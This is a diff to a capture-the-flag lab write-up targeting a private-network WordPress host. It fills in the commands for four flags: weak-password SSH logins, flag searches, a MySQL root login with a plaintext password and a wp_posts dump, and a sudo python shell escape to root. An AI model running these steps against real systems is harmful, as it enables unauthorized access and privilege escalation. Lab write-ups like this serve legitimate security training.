@@ -49,9 +49,10 @@ flag1.txt: ![](Images/6.0-Flag1%20Found.png)
 
 Exploit Used
 
-- TODO: Identify the exploit used
-- TODO: Include the command run
-
+- Weak password
+- ssh michael@192.168.1.110
+- cd /var/www/
+- grep -RE flag
 
 
 flag2.txt: ![](Images/7.0-Flag2%20Found.png)
@@ -59,5 +60,31 @@ flag2.txt: ![](Images/7.0-Flag2%20Found.png)
 
 Exploit Used
 
-- TODO: Identify the exploit used
-- TODO: Include the command run
+- Weak password
+- ssh michael@192.168.1.110
+- cd /var/www/
+- ls
+- cat flag2.txt
+
+flag3.txt: 
+
+Exploit Used
+
+- Weak password
+- ssh michael@192.168.1.110
+- cd /var/www/html/wordpress
+- mysql -u root -p
+- R@v3enSecurity
+- use wordpress;
+- SELECT * FROM wp_posts;
+
+flag4.txt: 
+
+Exploit Used
+
+- Privilege Escalation
+- ssh steven@192.168.1.110
+- sudo python -c 'import os;os.system("/bin/sh")'
+- cd ../..
+- cd root
+- cat flag4
